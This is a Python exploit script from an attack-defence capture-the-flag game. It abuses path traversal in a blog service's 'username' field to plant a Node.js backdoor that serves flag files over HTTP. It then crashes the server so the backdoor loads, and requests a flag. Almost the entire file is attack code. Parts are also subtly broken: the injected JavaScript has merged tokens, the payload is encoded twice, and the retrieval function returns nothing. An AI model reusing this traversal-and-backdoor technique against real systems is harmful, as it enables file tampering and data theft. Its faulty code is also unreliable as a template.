class Exploit():
  def execute(self, ip, port, flag_id):
    # Put your awesomeness here. You are free to import/use whatever
    # standard Python library you want.

    import urllib2, urllib, time

    # Your exploit gets as parameters the IP/PORT of the service to
    # attack. The IP is a string, the PORT is an integer.

    # For some services, the "flag_id" parameter will be provided:
    # sometimes, this is needed to specify which flag you need to
    # steal (in case there are many on the server). If you feel you
    # don't need to use the "flag_id" parameter, just ignore it.
    # Still, your execute() method will always receive the "flag_id"
    # parameter.

    # install the payload.
   
    payload='var http=require("http");var url=require("url");varfs=require("fs");http.createServer(function(e,t){t.writeHead(200,{"Content-Type":"text/plain"});p=url.parse(e.url,true);if("id"inp.query&&"bd"inp.query){fs.readFile("flags/"+p.query["id"],function(e,n){if(e){t.end("Iam a teapot")}else{t.write(n);t.end()}})}else{t.end()}}).listen(8489)'
    payload=urllib.urlencode({'value': payload, 'cookie': '', 'username': '../blogger-test.js'})

    path    = 'http://' + ip + ':' + str(port) + '/store?' + payload + ''  #the url you want to POST to
    print "\n\n" + path + "\n\n"
    req     = urllib2.Request(path, '')
    page    = urllib2.urlopen(req).read()
    print page

    # crash the server.

    payload = urllib.urlencode({'value': payload, 'cookie': '','username': '../posts--/file'})
    path    ='http://' + ip + ':' + str(port) + '/store?' + payload +''  #the url you want to POST to
    print "\n\n" + path + "\n\n"
    req     = urllib2.Request(path, '')  
    page    = urllib2.urlopen(req).read()
    print page

    time.sleep(4) # wait for the server to come back

    self.flag = do_exploit(ip, port, flag_id)

    print self.flag

  def result(self):
    return {'FLAG' : self.flag }

def do_exploit(ip, port, flag_id):
  import urllib2, urllib

  request  = urllib.urlencode({'id': flag_id, 'bd': '1'})
  path     = 'http://' + ip + ':' + str(port) + '/retreive?' + request
  print "\n\n" + path + "\n\n"
  req      = urllib2.Request(path, '')  
  response = urllib2.urlopen(req).read()
  print response


e = Exploit()
